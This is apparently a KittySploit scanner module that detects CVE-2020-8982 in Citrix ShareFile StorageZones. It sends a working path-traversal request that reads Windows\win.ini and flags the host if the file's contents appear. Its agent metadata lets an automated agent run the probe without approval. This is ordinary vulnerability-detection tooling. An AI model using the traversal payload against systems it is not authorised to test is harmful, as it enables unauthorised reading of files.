#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix ShareFile StorageZones (aka storage zones) Controller versions through at least 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix ShareFile StorageZones <=5.10.x - Arbitrary File Read Detection',
        'description': 'Citrix ShareFile StorageZones (aka storage zones) Controller versions through at least 5.10.x are susceptible to an unauthenticated arbitrary file read vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'citrix', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX269106',
            'https://drive.google.com/file/d/1Izd5MF_HHuq8YSwAyJLBErWL_nbe6f9v/view',
            'https://www.linkedin.com/posts/jonas-hansen-2a2606b_citrix-sharefile-storage-zones-controller-activity-6663432907455025152-8_w6/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8982',
            'https://github.com/0xT11/CVE-POC',
        ],
        'cve': 'CVE-2020-8982',
    }

    def run(self):
        r = self.http_request(method="GET", path='/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Citrix ShareFile StorageZones <=5.10.x - Arbitrary File Read detected",
                path='/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri',
            )
            return True
        return False

